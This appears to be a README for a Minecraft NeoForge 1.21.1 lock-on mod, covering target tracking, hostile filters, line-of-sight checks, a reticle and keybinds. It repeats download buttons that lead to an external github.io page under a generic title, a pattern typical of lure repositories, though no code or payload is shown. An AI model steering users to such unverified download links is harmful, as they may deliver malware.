# Action Camera Lock-On v1.0 - Game Script Utility 2026

> **Minecraft NeoForge 1.21.1 client-side mod for camera lock-on, target tracking, and configurable combat support.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20NeoForge%201.21.1-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandonmvzebaker8171/action-camera-lockon-client?style=flat-square)](https://github.com/brandonmvzebaker8171/action-camera-lockon-client)

---

<p align="center">
  <a href="https://brandonmvzebaker8171.github.io/action-camera-lockon-client/">
    <img src="https://img.shields.io/badge/Download-Action%20Camera%20Lock-On%20Script-brightgreen?style=for-the-badge" alt="Download Action Camera Lock-On Script">
  </a>
</p>

> **[Download Action Camera Lock-On](https://brandonmvzebaker8171.github.io/action-camera-lockon-client/)**

---

[Download Latest Build](https://brandonmvzebaker8171.github.io/action-camera-lockon-client/)

---

## What It Does

Action Camera Lock-On is a client-side mod for Minecraft NeoForge 1.21.1 that keeps the camera oriented toward a selected target. Its primary purpose is to support combat and target tracking while allowing players to define how target selection, camera movement, and target changes should work.

A collection of lock modes and keybinds provides control during gameplay. The mod also displays a 3D reticle and offers selection rules including distance preference, hostile-entity filtering, and line-of-sight validation. These controls make it possible to tune lock-on behavior for different in-game conditions.

## Included Functionality

- Keeps the camera smoothly aligned with a locked entity
- Provides a smart mode that adapts as targets change
- Offers an always-lock mode for continuous target tracking
- Allows switching the lock between eligible targets
- Gives priority to entities based on proximity
- Can restrict selection to hostile entities
- Checks line of sight before accepting a target
- Renders a 3D reticle to identify the current target
- Includes an in-game screen for changing configuration
- Supports keybinds for fast lock and target-switch actions

## Installation

1. Get the newest build from the project download page.
2. Copy the mod JAR into your Minecraft `mods` directory.
3. Run the client using NeoForge 1.21.1.
4. Once in the game, open the configuration UI and set the lock modes, target rules, and keybinds you want to use.

The expected file location looks like this:

- `.minecraft/mods/ActionCameraLockOn-1.0.jar`

When using a larger mod collection, load Action Camera Lock-On with the NeoForge version that matches the client.

## Configuration Reference

The mod UI and keybind settings provide access to options such as these:

| Setting | Purpose |
|---|---|
| Smart Lock | Changes tracking behavior as the active target changes |
| Always Lock | Maintains the selected target while the mode is active |
| Target Switch | Changes the lock focus to another available target |
| Hostile Filter | Restricts possible targets to hostile entities |
| Line-of-Sight Check | Only allows targets that are currently visible |
| Proximity Priority | Selects nearby entities ahead of more distant ones |
| 3D Reticle | Shows or hides the in-world targeting marker |
| Keybinds | Sets shortcuts for locking and switching targets |

## Supported Environment

- Designed for Minecraft NeoForge 1.21.1
- Intended to run on the client side
- Uses Minecraft as its target game environment
- Results can vary according to nearby entities, visibility, and world state
- Other client mods that alter camera movement or entity processing may affect behavior

## Frequently Asked Questions

**What are the installation steps?**  
Download the build, move it into the Minecraft `mods` folder, and launch the game with NeoForge 1.21.1.

**How can I edit the mod settings?**  
After Minecraft has loaded, use the mod's in-game configuration UI.

**Are lock-on rules configurable?**  
Yes. You can adjust lock modes, target ordering, filters, and the keybinds used to control the system.

**Which Minecraft version does it support?**  
Action Camera Lock-On is intended for Minecraft NeoForge 1.21.1.

**Where are the settings saved?**  
Settings are managed through the in-game configuration system and Minecraft's normal mod storage behavior.

**Will camera mods affect it?**  
They can. Mods that modify camera behavior may change the way lock-on operates, and results depend on the other client modifications installed.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
